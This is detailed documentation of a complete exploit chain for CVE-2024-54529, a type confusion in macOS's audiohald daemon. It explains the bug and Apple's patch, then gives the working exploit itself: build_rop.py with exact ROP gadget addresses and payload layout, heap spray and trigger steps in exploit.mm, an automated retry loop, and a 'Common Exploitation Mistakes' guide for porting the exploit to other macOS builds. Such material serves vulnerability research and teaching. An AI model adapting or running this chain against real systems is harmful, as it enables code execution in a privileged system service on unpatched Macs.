# Part 3: CVE-2024-54529 Complete Exploit Chain Documentation

```
     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
     ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
     █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║
     ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║
     ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║
     ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝

                 CVE-2024-54529 Exploitation
                 ROP Chain Construction and Execution
```

---

## Audience Guide

```
┌─────────────────────────────────────────────────────────────────────────┐
│ AUDIENCE: Expert                                                        │
│ PREREQUISITES: ROP understanding, assembly, syscall knowledge           │
│ LEARNING OBJECTIVES:                                                    │
│   • Understand the complete CVE-2024-54529 exploit chain               │
│   • Learn how build_rop.py constructs the ROP payload                  │
│   • See exact gadget addresses and their purposes                      │
│   • Understand x86-64 macOS syscall conventions                        │
│   • Grasp the vulnerable handlers and Apple's fix                      │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Table of Contents

1. [CVE-2024-54529 - The Vulnerability](#section-k-cve-2024-54529---the-vulnerability)
   - [Vulnerability Overview](#k1-vulnerability-overview)
   - [Root Cause Analysis](#k2-root-cause-analysis)
   - [Apple's Fix](#k3-apples-fix)
2. [build_rop.py - ROP Chain Construction](#section-l-build_roppy---rop-chain-construction)
   - [File Overview](#l1-file-overview)
   - [Gadget Addresses](#l2-gadget-addresses)
   - [x86-64 Syscall Convention](#l3-x86-64-syscall-convention)
   - [ROP Chain Structure](#l4-rop-chain-structure)
   - [Inline String Technique](#l5-inline-string-technique)
   - [Python Code Walkthrough](#l6-python-code-walkthrough)
3. [exploit.mm - Detailed Code Analysis](#section-m-exploitmm---detailed-code-analysis)
   - [File Overview](#m1-file-overview)
   - [Mach Message Structures](#m2-mach-message-structures-from-xcode-sdk)
   - [Audiohald Message IDs](#m3-audiohald-message-ids)
   - [Key Functions Detailed](#m4-key-functions-detailed)
   - [Message Flow Diagram](#m5-message-flow-diagram)
4. [run_exploit.py - Orchestration](#section-n-run_exploitpy---orchestration)
   - [File Overview](#n1-file-overview)
   - [Configuration Constants](#n2-configuration-constants)
   - [Exploitation Algorithm](#n3-exploitation-algorithm)
5. [Common Exploitation Mistakes](#common-exploitation-mistakes)
6. [Debugging and Troubleshooting](#section-q-debugging-and-troubleshooting)

---

## Section K: CVE-2024-54529 - The Vulnerability

This section provides atomic-level detail on the complete exploit chain:
- CVE-2024-54529 vulnerability specifics
- build_rop.py: ROP chain construction
- exploit.mm: Heap spray and trigger implementation
- run_exploit.py: Orchestration and automation
- Mach message structures from Xcode SDK
- x86-64 syscall conventions and gadget mechanics

---

### K.1 Vulnerability Overview

| Field | Value |
|-------|-------|
| **CVE IDENTIFIER** | CVE-2024-54529 |
| **AFFECTED COMPONENT** | CoreAudio framework / audiohald daemon |
| **VULNERABILITY TYPE** | Type Confusion / Insufficient Type Validation |
| **CVSS v3.1 SCORE** | 7.8 (HIGH) |
| **CVSS VECTOR** | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |

#### Timeline

| Date | Event |
|------|-------|
| 2024-10-09 | Reported to Apple by Dillon Franke (Google Project Zero) |
| 2024-12-11 | Fixed in macOS Sequoia 15.2, Sonoma 14.7.2, Ventura 13.7.2 |
| 2025-01-07 | 90-day disclosure deadline |

#### Affected Versions

- macOS Sequoia < 15.2
- macOS Sonoma < 14.7.2
- macOS Ventura < 13.7.2

#### References

- https://projectzero.google/2025/05/breaking-sound-barrier-part-i-fuzzing.html
- https://nvd.nist.gov/vuln/detail/CVE-2024-54529
- https://github.com/googleprojectzero/p0tools/blob/master/CoreAudioFuzz/

---

### K.2 Root Cause Analysis

#### The Bug

The vulnerability exists in multiple handler functions within audiohald that process IOContext-related operations. These handlers:

1. Receive an `object_id` from the Mach message
2. Call `HALS_ObjectMap::CopyObjectByObjectID(object_id)` to retrieve object
3. **DEREFERENCE the object at fixed offsets WITHOUT checking the type**
4. Call virtual functions through the assumed vtable layout

#### Vulnerable Code Pattern (pseudocode)

```cpp
void _XIOContext_Fetch_Workgroup_Port(mach_msg_header_t *msg) {
    uint32_t object_id = *(uint32_t*)(msg + 0x30);

    // BUG: No type check before dereferencing!
    HALS_Object *obj = HALS_ObjectMap::CopyObjectByObjectID(object_id);

    if (obj) {
        // Assumes obj is an IOContext, but could be ANY object type!
        void *ptr = *(void**)(obj + 0x68);  // Dereference at offset
        void (*func)(void*) = *(void**)(ptr + 0x168);  // Get func pointer
        func(obj);  // CALL THROUGH CONTROLLED POINTER!
    }
}
```

#### Type Confusion Scenario

Object types have different memory layouts:

```
IOContext (expected):           Engine (actual):
+------------------+            +------------------+
| vtable           | 0x00       | vtable           | 0x00
+------------------+            +------------------+
| type = "ioct"    | 0x08       | type = "ngne"    | 0x08
+------------------+            +------------------+
| ...              |            | ...              |
+------------------+            +------------------+
| io_context_ptr   | 0x68  <--- | DIFFERENT DATA   | 0x68
+------------------+            +------------------+
```

When the handler accesses offset `0x68` expecting an IOContext, but receives an Engine object, the data at that offset is interpreted incorrectly.

#### Vulnerable Handlers (Message IDs)

| Message ID | Handler Name | Status |
|------------|--------------|--------|
| 1010010 | XIOContext_SetClientControlPort | Vulnerable |
| 1010011 | XIOContext_Start | Vulnerable |
| 1010012 | XIOContext_Stop | Vulnerable |
| 1010054 | XIOContext_StartAtTime | Vulnerable |
| 1010058 | XIOContext_Start_With_WorkInterval | Vulnerable |
| **1010059** | **XIOContext_Fetch_Workgroup_Port** | **USED IN THIS EXPLOIT** |

---

### K.3 Apple's Fix

Apple's patch adds type validation before dereferencing:

#### Patched Code (pseudocode)

```cpp
void _XIOContext_Fetch_Workgroup_Port(mach_msg_header_t *msg) {
    uint32_t object_id = *(uint32_t*)(msg + 0x30);

    HALS_Object *obj = HALS_ObjectMap::CopyObjectByObjectID(object_id);

    if (obj) {
        // NEW: Check object type before use
        if (strcmp(obj->type, "ioct") != 0) {
            return kAudioHardwareBadObjectError;
        }

        // Now safe to dereference as IOContext
        void *ptr = *(void**)(obj + 0x68);
        ...
    }
}
```

> **Note:** This pattern (checking type before use) was already present in some defensive handlers like `_XIOContext_PauseIO`, but missing in the vulnerable ones.

---

## Section L: build_rop.py - ROP Chain Construction

---

### L.1 File Overview

| Property | Value |
|----------|-------|
| **FILE** | exploit/build_rop.py |
| **PURPOSE** | Generate the ROP payload binary (rop_payload.bin) |
| **OUTPUT** | 1152-byte binary file containing ROP chain |
| **USAGE** | `python3 build_rop.py` (run before exploit) |

The ROP chain performs a simple proof-of-concept action:
- Creates a file at `/Library/Preferences/Audio/malicious.txt`
- This proves arbitrary code execution with audiohald privileges

---

### L.2 Gadget Addresses

> **WARNING:** These addresses are specific to a particular macOS version/build. They must be updated for different macOS versions due to ASLR and updates.

#### Addresses from build_rop.py (x86-64)

| Gadget Name | Address | Instruction | Purpose |
|-------------|---------|-------------|---------|
| `STACK_PIVOT_GADGET` | `0x7ff810b908a4` | `xchg rsp, rax ; xor edx, edx ; ret` | Pivots stack to attacker-controlled memory |
| `POP_RDI_GADGET` | `0x7ff80f185186` | `pop rdi ; ret` | Load first argument (rdi) for syscall |
| `POP_RSI_GADGET` | `0x7ff811fa1e36` | `pop rsi ; ret` | Load second argument (rsi) for syscall |
| `POP_RDX_GADGET` | `0x7ff811cce418` | `pop rdx ; ret` | Load third argument (rdx) for syscall |
| `POP_RAX_GADGET` | `0x7ff811c93b09` | `pop rax ; ret` | Load syscall number into rax |
| `ADD_HEX30_RSP` | `0x7ff80f17d035` | `add rsp, 0x30 ; pop rbp ; ret` | Skip over inline string data |
| `LOAD_RSP_PLUS_EIGHT` | `0x7ffd1491ac80` | `lea rax, [rsp + 8] ; ret` | Get pointer to stack (inline string) |
| `MOV_RAX_TO_RSI` | `0x7ff80f41b060` | `mov rsi, rax ; mov rax, rsi ; pop rbp ; ret` | Move value to rsi |
| `MOV_RSI_TO_RDI` | `0x7ff827af146d` | `mov rdi, rsi ; mov rax, rdi ; mov rdx, rdi ; ret` | Move value to rdi (first syscall argument) |
| `SYSCALL` | `0x7ff80f1534d0` | `syscall` | Execute system call |

#### Finding Gadgets

Tools to find ROP gadgets:

```bash
# ROPgadget
ROPgadget --binary /usr/lib/libSystem.B.dylib

# Ropper
ropper -f /usr/lib/libSystem.B.dylib

# radare2
/R pop rdi
```

Example with ROPgadget:
```bash
$ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "pop rdi"
0x00001234 : pop rdi ; ret
```

---

### L.3 x86-64 Syscall Convention

On macOS x86-64, syscalls use the following convention:

#### Register Usage

| Register | Purpose |
|----------|---------|
| `rax` | Syscall number (with 0x2000000 prefix for BSD syscalls) |
| `rdi` | First argument |
| `rsi` | Second argument |
| `rdx` | Third argument |
| `r10` | Fourth argument (rcx is used by syscall instruction) |
| `r8` | Fifth argument |
| `r9` | Sixth argument |

#### Syscall Number Encoding

macOS uses a class prefix in the syscall number:

| Prefix | Class | Description |
|--------|-------|-------------|
| `0x0000000` | Mach traps | Negative in traditional encoding |
| `0x1000000` | Mach traps | Alternative encoding |
| `0x2000000` | BSD syscalls | Standard POSIX calls |
| `0x3000000` | Machine-dependent | Architecture-specific calls |

#### BSD Syscall Numbers (from `<sys/syscall.h>`)

| Syscall | Number | With Class Prefix |
|---------|--------|-------------------|
| `SYS_open` | 5 | `0x2000005` |
| `SYS_close` | 6 | `0x2000006` |
| `SYS_read` | 3 | `0x2000003` |
| `SYS_write` | 4 | `0x2000004` |
| `SYS_mmap` | 197 | `0x20000C5` |

#### open() Syscall Details

```c
int open(const char *path, int flags, mode_t mode);
```

| Register | Value | Description |
|----------|-------|-------------|
| `rdi` | path | Pointer to filename string |
| `rsi` | flags | `O_CREAT \| O_WRONLY = 0x201` |
| `rdx` | mode | `0644 = 0x1A4` |
| `rax` | `0x2000005` | Syscall number |

---

### L.4 ROP Chain Structure

The ROP chain in build_rop.py constructs an `open()` syscall:

#### Payload Layout (1152 bytes total)

```
Offset  Content                          Purpose
------  -------                          -------
0x000   LOAD_RSP_PLUS_EIGHT addr         First gadget: lea rax, [rsp+8]
0x008   ADD_HEX30_RSP addr               Skip inline string
0x010   "/Library/Preferences/..."       41-byte inline filename
0x039   padding (0x42 bytes)             Filler for pop rbp
0x???   MOV_RAX_TO_RSI addr              Move string ptr to rsi
0x???   0x4242424242424242               pop rbp filler
0x???   MOV_RSI_TO_RDI addr              Move to rdi (arg1)
0x???   POP_RSI_GADGET addr              Prepare to load flags
0x???   0x0000000000000201               O_CREAT | O_WRONLY
0x???   POP_RDX_GADGET addr              Prepare to load mode
0x???   0x00000000000001A4               0644 permissions
0x???   POP_RAX_GADGET addr              Prepare syscall number
0x???   0x0000000002000005               open() syscall number
0x???   SYSCALL addr                     Execute syscall!
...
0x168   STACK_PIVOT_GADGET addr          ENTRY POINT for vtable call
...
0x47F   (padding to 1152 bytes)
```

#### Execution Flow

```
Step  Action
----  ------
1     Vulnerability calls vtable function at offset 0x168
2     Stack pivots: xchg rsp, rax (rax points to our payload)
3     RSP now points to our ROP chain at offset 0x000
4     First gadget: lea rax, [rsp+8] - get pointer to inline string
5     add rsp, 0x30 - skip over the string, pop rbp
6     Chain continues, moving string pointer to rdi
7     Set rsi = 0x201 (O_CREAT | O_WRONLY)
8     Set rdx = 0x1A4 (mode 0644)
9     Set rax = 0x2000005 (open syscall)
10    syscall - creates the file!
```

#### Why Offset 0x168?

The vulnerable code dereferences at offset `0x168` to get a function pointer:

```cpp
void (*func)(void*) = *(void**)(ptr + 0x168);
func(obj);
```

By placing `STACK_PIVOT_GADGET` at offset `0x168` in our payload, when the vtable is read from our controlled memory, the function pointer points to our stack pivot gadget.

---

### L.5 Inline String Technique

The ROP chain embeds the filename directly in the payload:

```python
INLINE_STRING = b"/Library/Preferences/Audio/malicious.txt\x00"
```

This is 41 bytes including the null terminator.

#### Why Inline?

1. No need to find string in memory
2. String address is calculated relative to RSP
3. `lea rax, [rsp + 8]` gives us the address
4. Simpler than heap spray for string

#### Path Choice

`/Library/Preferences/Audio/` is chosen because:

1. audiohald has write permissions there
2. Proves code execution with elevated privileges
3. Doesn't require root (audiohald runs as _coreaudiod)

---

### L.6 Python Code Walkthrough

Key code from build_rop.py:

```python
# Helper for 64-bit little-endian packing
def p64(val):
    return struct.pack("<Q", val)

# Build the ROP chain
rop = bytearray(p64(LOAD_RSP_PLUS_EIGHT))  # First: get string address
rop += p64(ADD_HEX30_RSP)                   # Skip string
rop += INLINE_STRING                        # The filename
rop += b'\x42' * 15                         # Padding
rop += p64(MOV_RAX_TO_RSI)                  # String addr -> rsi
rop += p64(0x4242424242424242)              # pop rbp filler
rop += p64(MOV_RSI_TO_RDI)                  # rsi -> rdi (arg1)
rop += p64(POP_RSI_GADGET)                  # Prepare flags
rop += p64(0x201)                           # O_CREAT | O_WRONLY
rop += p64(POP_RDX_GADGET)                  # Prepare mode
rop += p64(0x1A4)                           # 0644
rop += p64(POP_RAX_GADGET)                  # Prepare syscall num
rop += p64(0x2000005)                       # SYS_open
rop += p64(SYSCALL)                         # Execute!

# Pad to 1152 bytes
rop += b'\x42' * (1152 - len(rop))

# Place stack pivot at vtable offset
rop[0x168:0x170] = p64(STACK_PIVOT_GADGET)

# Write to file
with open("rop_payload.bin", "wb") as f:
    f.write(rop)
```

---

## Section M: exploit.mm - Detailed Code Analysis

---

### M.1 File Overview

| Property | Value |
|----------|-------|
| **FILE** | exploit/exploit.mm |
| **PURPOSE** | Main exploit implementation (Objective-C++) |
| **COMPILATION** | `clang++ -framework CoreFoundation -framework CoreAudio exploit.mm -o exploit` |

The exploit performs:

1. Connect to audiohald via Mach IPC
2. Register as a client (XSystem_Open)
3. Heap spray with ROP payload via plist property values
4. Create holes by freeing allocations
5. Create Engine objects to reclaim holes
6. Trigger vulnerability (XIOContext_Fetch_Workgroup_Port)

---

### M.2 Mach Message Structures from Xcode SDK

From `/Applications/Xcode.app/.../usr/include/mach/message.h`:

#### Message Header (mach_msg_header_t)

```c
typedef struct {
    mach_msg_bits_t       msgh_bits;         // Port rights + flags
    mach_msg_size_t       msgh_size;         // Total message size
    mach_port_t           msgh_remote_port;  // Destination port
    mach_port_t           msgh_local_port;   // Reply port
    mach_port_name_t      msgh_voucher_port; // Voucher port
    mach_msg_id_t         msgh_id;           // Message identifier
} mach_msg_header_t;
```

#### OOL Descriptor (mach_msg_ool_descriptor_t) - 64-bit

```c
typedef struct {
    void                         *address;    // Data address
    boolean_t                     deallocate: 8;
    mach_msg_copy_options_t       copy: 8;
    unsigned int                  pad1: 8;
    mach_msg_descriptor_type_t    type: 8;    // = 1 for OOL
    mach_msg_size_t               size;       // Data size
} mach_msg_ool_descriptor_t;
```

#### Port Descriptor (mach_msg_port_descriptor_t)

```c
typedef struct {
    mach_port_t                   name;       // Port name
    mach_msg_size_t               pad1;
    unsigned int                  pad2 : 16;
    mach_msg_type_name_t          disposition : 8;  // Right type
    mach_msg_descriptor_type_t    type : 8;         // = 0 for port
} mach_msg_port_descriptor_t;
```

#### Descriptor Types

```c
#define MACH_MSG_PORT_DESCRIPTOR         0
#define MACH_MSG_OOL_DESCRIPTOR          1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR    2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR 3
```

#### Copy Options

```c
#define MACH_MSG_PHYSICAL_COPY   0  // Actually copy data
#define MACH_MSG_VIRTUAL_COPY    1  // COW (copy-on-write)
#define MACH_MSG_ALLOCATE        2  // Kernel allocates for receiver
```

---

### M.3 Audiohald Message IDs

Complete message ID enumeration from `helpers/message_ids.h`:

| Message ID | Name | Description |
|------------|------|-------------|
| 1010000 | XSystem_Open | Initialize client |
| 1010001 | XSystem_Close | Close client |
| 1010002 | XSystem_GetObjectInfo | Get object type |
| 1010003 | XSystem_CreateIOContext | Create I/O context |
| 1010004 | XSystem_DestroyIOContext | Destroy I/O context |
| 1010005 | XSystem_CreateMetaDevice | Create aggregate device |
| 1010006 | XSystem_DestroyMetaDevice | Destroy aggregate device |
| ... | ... | ... |
| 1010034 | XObject_SetPropertyData_DPList | Set property (plist) |
| ... | ... | ... |
| 1010042 | XObject_GetPropertyData_DCFString_QPList | Used for mktp |
| ... | ... | ... |
| **1010059** | **XIOContext_Fetch_Workgroup_Port** | **VULNERABLE!** |

#### Message Structure Pattern

Messages with OOL data follow this pattern:

```
+------------------------+
| mach_msg_header_t      |  28 bytes
+------------------------+
| descriptor_count       |  4 bytes
+------------------------+
| descriptors[]          |  Variable (16 bytes each on 64-bit)
+------------------------+
| body data              |  Variable
+------------------------+
```

---

### M.4 Key Functions Detailed

#### create_mach_port_with_send_and_receive_rights()

Creates a port we can both send to and receive from.

**Step 1:** `mach_port_allocate(..., MACH_PORT_RIGHT_RECEIVE, &port)`
- Creates port with receive right
- We can receive messages on this port

**Step 2:** `mach_port_insert_right(..., MACH_MSG_TYPE_MAKE_SEND)`
- Adds send right from our receive right
- We can now also send to this port

#### generateAllocationPlistBinary()

Creates binary plist with ROP payload as UTF-16 strings.

1. Load rop_payload.bin (1152 bytes)
2. Convert to UTF-16LE (576 code units)
3. Create CFString from bytes
4. Add to CFArray (allocs_per_iteration copies)
5. Wrap in CFDictionary with key "arr"
6. Serialize to binary plist

**Result:** Binary plist that when parsed, creates heap allocations containing our ROP payload.

#### doAllocations()

Performs heap spray by repeatedly sending plist data.

For each iteration:
1. Create MetaDevice (message 1010005)
2. Set property 'acom' with plist (message 1010034)
3. Each string in plist creates ~1168 byte allocation
4. Total allocations = iterations x allocs_per_iteration

#### freeAllocation()

Creates heap holes by replacing large allocations.

Sends message 1010034 with tiny plist:
```xml
<dict><key>arr</key><string>FREE</string></dict>
```

When audiohald processes this:
1. Old CFArray is released
2. All CFStrings in array are released
3. Backing buffers (with payload) are freed
4. Freed slots go to allocator freelist

#### createEngineObjects()

Creates Engine objects that may land in freed holes.

Sends message 1010042 with selector 'mktp':
- 'mktp' = "make tap" - creates Engine/Tap object
- Engine object allocated via new/malloc
- May reuse freed slot containing payload

#### trigger_vulnerability()

Triggers the type confusion bug.

Sends message 1010059 (XIOContext_Fetch_Workgroup_Port):
- Specifies object_id of an Engine object
- Handler expects IOContext, gets Engine
- Dereferences at wrong offset
- If Engine in controlled memory, calls our gadget

---

### M.5 Message Flow Diagram

```
EXPLOIT                              AUDIOHALD
-------                              ---------

1. bootstrap_look_up("com.apple.audio.audiohald")
   ----------------------------------------->
   <-----------------------------------------
   (receive send right to service_port)

2. Send message 1010000 (XSystem_Open)
   ----------------------------------------->
   (audiohald creates client state)

3. Send message 1010005 (CreateMetaDevice)
   ----------------------------------------->
   (audiohald creates MetaDevice N)
   <-----------------------------------------
   (returns object_id = N)

4. Send message 1010034 (SetPropertyData)
   [OOL: binary plist with payload]
   ----------------------------------------->
   (audiohald parses plist)
   (creates CFArray with CFStrings)
   (each CFString allocs ~1168 bytes)
   (PAYLOAD NOW IN HEAP)

5. Repeat steps 3-4 for num_iterations

6. Send message 1010034 (SetPropertyData)
   [OOL: small plist]
   ----------------------------------------->
   (audiohald replaces property)
   (old CFStrings released)
   (HOLES CREATED IN HEAP)

7. Send message 1010042 (GetPropertyData)
   [selector = 'mktp']
   ----------------------------------------->
   (audiohald creates Engine object)
   (Engine may land in hole!)
   (Engine memory contains payload residue)

8. Send message 1010002 (GetObjectInfo)
   ----------------------------------------->
   <-----------------------------------------
   (returns object type, e.g., "ngnejboa")

9. Send message 1010059 (FetchWorkgroupPort)
   [object_id = Engine object]
   ----------------------------------------->
   (audiohald handler:)
     - Fetches object by ID
     - Dereferences at offset 0x68
     - Gets "vtable" pointer (our data!)
     - Calls function at offset 0x168
     - STACK PIVOT! RSP = our payload
     - ROP CHAIN EXECUTES!
     - open() syscall creates file
```

---

## Section N: run_exploit.py - Orchestration

---

### N.1 File Overview

| Property | Value |
|----------|-------|
| **FILE** | exploit/run_exploit.py |
| **PURPOSE** | Automate exploitation loop with retry logic |
| **USAGE** | `python3 run_exploit.py [options]` |

The script:
1. Checks prerequisites (exploit binary, ROP payload)
2. Backs up original plist files
3. Performs heap grooming (one-time)
4. Crashes audiohald to reload with groomed heap
5. Repeatedly triggers vulnerability until success
6. Checks for success indicator file

---

### N.2 Configuration Constants

```python
TARGET_FILE = "/Library/Preferences/Audio/malicious.txt"
  # File created by successful ROP chain
  # Existence indicates successful exploitation

PLIST_PATH = "/Library/Preferences/Audio/com.apple.audio.SystemSettings.plist"
  # CoreAudio settings file
  # Size indicates heap state

MIN_PLIST_SIZE = 1
MAX_PLIST_SIZE = 10240
  # Used to detect if grooming is needed
  # Small plist = fresh state = needs grooming
```

---

### N.3 Exploitation Algorithm

#### Phase 1: Heap Grooming (one-time)

```python
if (plist_size < MAX_PLIST_SIZE && !has_groomed):
    run: ./exploit --iterations 20 --allocs 1200
    # This creates 20 x 1200 = 24,000 allocations
    # Each ~1168 bytes = ~28 MB of spray data

    run: ./exploit --pre-crash
    # Crashes audiohald with invalid object ID
    # launchd restarts audiohald
    # audiohald loads plist, heap now large

    has_groomed = True
```

#### Phase 2: Exploitation Loop

```python
while (!file_exists(TARGET_FILE)):
    run: ./exploit --attempts 1
    # Finds Engine object
    # Triggers vulnerability

    sleep(3)
    # Wait for results
```

#### Success Detection

- Check if `/Library/Preferences/Audio/malicious.txt` exists
- File creation = ROP chain executed = code execution achieved

---

### N.4 Command Line Options

| Option | Description |
|--------|-------------|
| `--no-reset` | Skip environment reset (for debugging) |
| `--has-groomed` | Skip heap grooming phase (if already done). Useful for repeated runs without restarting |

---

### N.5 Helper Script: reset-devices.sh

| Property | Value |
|----------|-------|
| **FILE** | exploit/reset-devices.sh |
| **PURPOSE** | Reset CoreAudio to clean state |

Actions:
1. Restore default plist files
2. Unload coreaudiod via launchctl
3. Reload coreaudiod via launchctl

This ensures a fresh start for exploitation attempts.

---

## Common Exploitation Mistakes

This section covers the most common errors when adapting or running this exploit.

### 1. Using Wrong Syscall Class Prefix

**The Mistake:**
```python
# WRONG - Using raw syscall number
rax = 5  # SYS_open

# CORRECT - Include BSD syscall class prefix
rax = 0x2000005  # BSD class (0x2000000) + SYS_open (5)
```

**Why It Fails:**
macOS XNU uses a class-based syscall system. BSD syscalls require the `0x2000000` prefix. Without it, the kernel interprets the syscall number as a Mach trap, which will either fail or call a completely different function.

**Quick Reference:**
| Class | Prefix | Examples |
|-------|--------|----------|
| Mach traps | `0x0000000` / `0x1000000` | mach_msg, task_self |
| BSD syscalls | `0x2000000` | open, read, write, mmap |
| Machine-dependent | `0x3000000` | thread_fast_set_cthread_self |

---

### 2. Incorrect Gadget Addresses for Different macOS Versions

**The Mistake:**
Using gadget addresses from one macOS version on a different version.

**Why It Fails:**
- Different macOS versions have different library layouts
- System libraries are rebuilt with each release
- Gadgets may not exist at the same offsets (or at all)

**Solution:**
1. Identify your exact macOS version and build number:
   ```bash
   sw_vers
   # ProductName:    macOS
   # ProductVersion: 14.7.1
   # BuildVersion:   23H222
   ```

2. Extract and analyze the dyld shared cache:
   ```bash
   dyld_shared_cache_util -extract /tmp/cache \
       /System/Library/dyld/dyld_shared_cache_x86_64h
   ```

3. Find new gadgets in the extracted libraries:
   ```bash
   ROPgadget --binary /tmp/cache/usr/lib/system/libsystem_c.dylib
   ```

4. Update all addresses in `build_rop.py`

---

### 3. Not Handling ASLR Properly

**The Mistake:**
Assuming fixed addresses will work across reboots or processes.

**Why It Fails:**
macOS implements ASLR (Address Space Layout Randomization):
- Shared library base addresses change on each boot
- User process memory layout is randomized per-execution

**How This Exploit Handles ASLR:**
- Uses the **dyld shared cache**, which has a fixed slide per boot
- Gadget addresses remain consistent for all processes until reboot
- Once you determine the current slide, addresses work across processes

**Finding the Current Slide:**
```bash
# In lldb, attach to any process
(lldb) image list -o
# Shows slide offset for each library
```

---

### 4. Forgetting That Heap Spray Needs Correct Size Class

**The Mistake:**
```python
# WRONG - Random payload size
payload = b"A" * 500  # Some arbitrary size
```

**Why It Fails:**
Modern allocators use **size classes** (buckets). Allocations of similar sizes go to the same pool. To have your sprayed data reclaim a freed object's memory, your allocation must land in the same size class.

**The Correct Approach:**

1. **Determine target object size:**
   ```bash
   # Dump heap and find Engine object size
   sudo heap -addresses all audiohald | grep Engine
   ```

2. **Match the size class:**
   - Engine objects in this exploit are ~1152-1168 bytes
   - The ROP payload is exactly 1152 bytes
   - CFString backing stores add ~16 bytes overhead
   - Total ~1168 bytes = same size class as Engine

3. **Spray Configuration:**
   ```python
   PAYLOAD_SIZE = 1152  # Matches Engine object allocation size
   ALLOCS_PER_ITERATION = 1200  # Enough to fill the size class
   ITERATIONS = 20  # Build up heap pressure
   ```

**Size Class Reference (libmalloc):**

| Size Range | Quantum | Purpose |
|------------|---------|---------|
| 1-256 bytes | 16 bytes | Tiny objects |
| 257-1008 bytes | 16 bytes | Small objects |
| 1009-15360 bytes | 512 bytes | Small (large quantum) |
| >15360 bytes | 4096 bytes | Large objects |

---

### 5. Additional Common Mistakes

#### Forgetting Return Address Alignment

x86-64 requires 16-byte stack alignment before `call` instructions. ROP chains that don't maintain alignment may crash on certain instructions (especially SSE operations).

**Fix:** Add or remove 8-byte padding gadgets (`ret`) as needed.

#### Not Accounting for pop rbp Side Effects

Many gadgets include `pop rbp` as a side effect. Each `pop` consumes 8 bytes from the stack.

**Fix:** Include filler values (`0x4242424242424242`) for each `pop` in the chain.

#### Incorrect Offset for Vtable Entry

The vulnerable code reads a function pointer at offset `0x168`. Placing the stack pivot gadget at any other offset will not work.

**Verification:**
```bash
# Check the binary for the exact offset
otool -tV /usr/libexec/audiohald | grep -A5 "XIOContext_Fetch"
```

---

## Section Q: Debugging and Troubleshooting

---

### Q.1 Common Issues and Solutions

| Issue | Cause | Fix |
|-------|-------|-----|
| "Failed to open rop_payload.bin" | ROP payload not generated | Run `python3 build_rop.py` first |
| "bootstrap lookup failed" | audiohald not running | `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.audio.coreaudiod.plist` |
| Exploit runs but no file created | Gadget addresses wrong for this macOS version | Find new gadgets for your specific macOS build |
| audiohald crashes but no code execution | Heap layout didn't align correctly | Try different iteration/allocs values |
| "rop_payload.bin must be exactly 1152 bytes" | Modified build_rop.py incorrectly | Ensure padding fills to exactly 1152 bytes |

---

### Q.2 Debugging Commands

```bash
# Check if audiohald is running
ps aux | grep audiohald

# View audiohald crash logs
ls ~/Library/Logs/DiagnosticReports/audiohald*
cat ~/Library/Logs/DiagnosticReports/audiohald_*.crash

# Monitor audiohald activity
sudo fs_usage -w | grep audiohald

# Check heap state
sudo heap -addresses all audiohald

# Trace Mach messages
sudo dtrace -n 'mach_msg*:entry { @[execname] = count(); }'

# Verify ROP payload
xxd rop_payload.bin | head -20
python3 -c "print(len(open('rop_payload.bin','rb').read()))"
```

---

### Q.3 Finding Gadgets for Different macOS Versions

The ROP gadget addresses in build_rop.py are version-specific. To find gadgets for a different macOS version:

1. **Dump the dyld shared cache:**
   ```bash
   dyld_shared_cache_util -extract /tmp/cache \
       /System/Library/dyld/dyld_shared_cache_x86_64h
   ```

2. **Find gadgets in libsystem_c.dylib:**
   ```bash
   ROPgadget --binary /tmp/cache/usr/lib/system/libsystem_c.dylib
   ```

3. **Search for specific patterns:**
   ```bash
   ROPgadget --binary ... | grep "pop rdi ; ret"
   ROPgadget --binary ... | grep "xchg rsp"
   ROPgadget --binary ... | grep "syscall"
   ```

4. **Calculate actual addresses:**
   - Get base address from dyld cache
   - Add gadget offset
   - Account for ASLR slide if needed

---

## Build Process

### O.1 Exploit Makefile

**FILE:** exploit/Makefile

```makefile
CXX = clang++
CFLAGS = -g -O0 -fno-omit-frame-pointer -Wall -Wextra -std=c++17
FRAMEWORKS = -framework CoreFoundation -framework CoreAudio

exploit: exploit.mm
    $(CXX) $(CFLAGS) $(FRAMEWORKS) exploit.mm -o exploit
```

#### Build Flags Explained

| Flag | Purpose |
|------|---------|
| `-g` | Include debug symbols |
| `-O0` | No optimization (easier debugging) |
| `-fno-omit-frame-pointer` | Keep frame pointer for backtraces |
| `-Wall -Wextra` | Enable warnings |
| `-std=c++17` | C++17 standard (for std::vector, etc.) |

#### Required Frameworks

| Framework | Purpose |
|-----------|---------|
| CoreFoundation | For CFString, CFArray, CFDictionary, CFPropertyList |
| CoreAudio | Not strictly needed but included for completeness |

### O.2 Complete Build Process

```bash
# Step 1: Generate ROP payload
cd exploit
python3 build_rop.py
# [*] ROP chain written to rop_payload.bin

# Step 2: Compile exploit
make
# clang++ -g -O0 ... exploit.mm -o exploit

# Step 3: Run exploit
python3 run_exploit.py
# === CoreAudio Exploit Runner ===
# [*] Starting exploit loop...
```

---

## SDK Header References

### P.1 Key Header File Locations (Xcode SDK)

**BASE PATH:** `/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/`

#### Mach Headers

| Header | Contents |
|--------|----------|
| `mach/message.h` | Message structures, bits, options |
| `mach/port.h` | Port types and rights |
| `mach/mach.h` | Master header (includes all) |
| `mach/mach_port.h` | Port manipulation functions |
| `mach/vm_map.h` | Virtual memory operations |
| `mach/kern_return.h` | Kernel return codes |

#### Bootstrap

| Header | Contents |
|--------|----------|
| `servers/bootstrap.h` | Service lookup functions |

#### Syscalls

| Header | Contents |
|--------|----------|
| `sys/syscall.h` | Syscall number definitions |

#### CoreFoundation

| Header | Contents |
|--------|----------|
| `CoreFoundation/CFString.h` | CFString functions |
| `CoreFoundation/CFArray.h` | CFArray functions |
| `CoreFoundation/CFDictionary.h` | CFDictionary functions |
